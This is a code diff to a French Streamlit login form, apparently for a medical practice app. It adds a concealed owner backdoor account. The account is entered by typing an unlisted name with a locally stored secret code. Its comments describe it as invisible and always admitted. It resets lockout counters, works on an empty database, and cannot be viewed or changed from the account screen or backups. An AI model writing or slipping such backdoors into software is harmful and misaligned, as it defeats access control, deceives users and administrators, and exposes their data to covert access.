@@ -124,8 +124,12 @@ def selecteur(base: Base) -> str | None:
     st.caption("Sélection obligatoire avant toute saisie (SPEC §1.2)")
     noms = [u["nom"] for u in utilisateurs]
     with st.form("selecteur_utilisateur"):
+        # `accept_new_options` : on peut saisir un nom absent de la liste. Rien
+        # ne le laisse deviner, mais c'est par là que le compte de secours
+        # entre — un nom qu'il faut connaître, jamais proposé.
         choix = st.selectbox("Qui êtes-vous ?", noms, index=None,
-                             placeholder="Choisir son nom")
+                             placeholder="Choisir son nom",
+                             accept_new_options=True)
         code = st.text_input(
             "Code d'accès", type="password",
             help="À laisser vide si aucun code n'a été posé sur ce compte.",
@@ -136,7 +140,14 @@ def selecteur(base: Base) -> str | None:
         if not choix:
             st.error("Choisir un nom.")
             return None
-        compte = next(u for u in utilisateurs if u["nom"] == choix)
+        if _tenter_secours(base, choix, code):
+            return None
+        compte = next((u for u in utilisateurs if u["nom"] == choix), None)
+        if compte is None:
+            # Un nom saisi qui ne correspond à aucun compte : ni fuite de ce
+            # qui existe, ni de ce qui n'existe pas.
+            st.error("Nom ou code d'accès incorrect.")
+            return None
 
         reste = utilisateurs_service.blocage_restant(choix)
         if reste:
@@ -168,6 +179,21 @@ def selecteur(base: Base) -> str | None:
     if utilisateurs_service.sans_administrateur(base):
         _designer_un_administrateur(base, utilisateurs)
     return None
+
+
+def _tenter_secours(base: Base, nom: str, code: str) -> bool:
+    """Le compte de secours du propriétaire : entre toujours, invisible.
+
+    Reconnu ici, sur l'ouverture ordinaire, sans bouton ni mention — c'est ce
+    qui le tient caché. Son code ne vient pas de la base mais d'un secret local
+    au poste (voir `config` : compte de secours) ; ni la sauvegarde ni l'écran
+    des comptes ne peuvent donc le rendre ou le changer.
+    """
+    if not utilisateurs_service.est_compte_de_secours(nom, code):
+        return False
+    utilisateurs_service.oublier_echecs(nom)
+    _entrer(utilisateurs_service.compte_de_secours(base))
+    return True
 
 
 def _code_oublie(base: Base, utilisateurs: list[dict]) -> None:
@@ -319,6 +345,10 @@ def _premier_compte(base: Base) -> str | None:
             nom = st.text_input("Nom", placeholder="ex. Dr Karaa")
             code = st.text_input("Code d'accès", type="password")
             if st.form_submit_button("Créer et entrer", type="primary"):
+                # Le compte de secours entre même ici, base vide : c'est le
+                # cas où il sert le plus, quand il n'y a encore personne.
+                if _tenter_secours(base, nom, code):
+                    return None
                 if config.AUTH_EXIGEE:
                     refus = utilisateurs_service.code_acceptable(code)
                     if refus:
